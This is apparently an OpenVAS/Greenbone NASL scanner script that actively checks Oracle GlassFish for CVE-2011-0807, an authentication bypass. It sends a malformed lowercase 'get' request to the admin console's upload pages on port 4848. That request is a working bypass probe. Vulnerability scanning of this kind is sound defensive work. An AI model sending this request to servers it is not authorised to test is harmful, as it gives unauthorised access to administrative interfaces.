# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:oracle:glassfish_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801926");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2011-0807");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Oracle GlassFish / System Application Server Security Bypass Vulnerability (Apr 2011) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_eclipse_glassfish_http_detect.nasl");
  script_mandatory_keys("eclipse/glassfish/http/detected", "GlassFishAdminConsole/port");
  script_require_ports("Services/www", 4848);

  script_tag(name:"summary", value:"GlassFish / System Application Server is prone to a security
  bypass vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw exists in the Web Administration component which
  listens by default on TCP port 4848. When handling a malformed GET request to the administrative
  interface, the application does not properly handle an exception allowing the request to proceed
  without authentication.");

  script_tag(name:"impact", value:"Successful exploitation could allow local attackers to execute
  arbitrary code under the context of the application.");

  script_tag(name:"affected", value:"Oracle GlassFish version 2.1, 2.1.1 and 3.0.1 and Oracle Java
  System Application Server 9.1");

  script_tag(name:"solution", value:"Apply the security updates.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47438");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/cve/CVE-2011-0807");
  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/topics/security/cpuapr2011-301950.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!version = get_app_version(cpe: CPE, port: port))
  exit(0);

if (!port = get_kb_item("GlassFishAdminConsole/port"))
  exit(0);

host = http_host_name(port: port);

if (version =~ "^2") {
  url = "/applications/upload.jsf";
  req = string("get ", url, " HTTP/1.1\r\nHost: ", host, "\r\n\r\n");
} else if (version =~ "^3") {
  url = "/common/applications/uploadFrame.jsf";
  req = string("get ", url, " HTTP/1.1\r\nHost: ", host, "\r\n\r\n");
}

if (req) {
  res = http_send_recv(port: port, data: req);

  if (res) {
    if (egrep(pattern: "<title>Deploy.*Applications.*Modules</title>", string: res)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
